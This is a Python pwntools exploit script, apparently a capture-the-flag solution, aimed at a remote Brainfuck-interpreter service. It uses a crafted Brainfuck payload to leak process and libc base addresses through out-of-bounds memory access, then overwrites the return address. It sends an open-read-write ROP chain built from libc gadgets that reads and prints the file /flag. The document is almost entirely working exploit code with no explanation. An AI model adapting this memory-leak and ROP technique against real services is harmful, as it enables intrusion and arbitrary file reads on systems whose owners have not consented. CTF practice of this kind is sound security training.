from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

# sh = process(['./pwn'])
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
sh = remote("172.51.65.235", 9999)

payload1 = b",[>,]"  # padding loop
payload1 += b">"*0x0F  # padding to proc
payload1 += b">."*0x6  # retrieve proc
payload1 += b">"*0x1A  # padding to libc
payload1 += b">."*0x6  # retrieve libc
payload1 += b"<"*0x25  # fallback to overwrite return addr
payload1 += b",>"*(29*0x08)  # orw!

sh.sendafter(b"BF_PARSER>>", payload1)
sh.send(b"A"*520)
# gdb.attach(sh, 'b getchar')
# pause()
sh.send(b'\x00')
sh.recvline()

proc_base = sh.recv(1)
proc_base += sh.recv(5)
proc_base = u64(proc_base.ljust(8, b'\x00')) - 0x1955
libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x24083

pop_rax_ret_addr = libc_base + 0x36174
pop_rdi_ret_addr = libc_base + 0x23b6a
pop_rsi_ret_addr = libc_base + 0x02601f
pop_rdx_ret_addr = libc_base + 0x142c92
bss_addr = proc_base + elf.bss() + 0x100

print("bss_addr >>>", hex(bss_addr))
print("libc_base >>>", hex(libc_base))
print("proc_base >>>", hex(proc_base))

payload = p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_ret_addr) + p64(bss_addr) + p64(pop_rdx_ret_addr) + p64(0x100) + p64(libc_base + libc.sym['read'])
payload += p64(pop_rdi_ret_addr) + p64(0) + p64(libc_base + libc.sym['close'])
payload += p64(pop_rdi_ret_addr) + p64(bss_addr) + p64(pop_rsi_ret_addr) + p64(0) + p64(libc_base + libc.sym['open']) 
payload += p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_ret_addr) + p64(bss_addr + 0x100) + p64(pop_rdx_ret_addr) + p64(0x100) + p64(libc_base + libc.sym['read'])
payload += p64(pop_rdi_ret_addr) + p64(1) + p64(pop_rsi_ret_addr) + p64(bss_addr + 0x100) + p64(pop_rdx_ret_addr) + p64(0x100) + p64(libc_base + libc.sym['write'])

# gdb.attach(sh, 'b *' + hex(pop_rdi_ret_addr))
# pause()
# print(hex(len(payload1)))

sh.send(payload)
sh.sendline(b"/flag\x00")
sh.interactive()
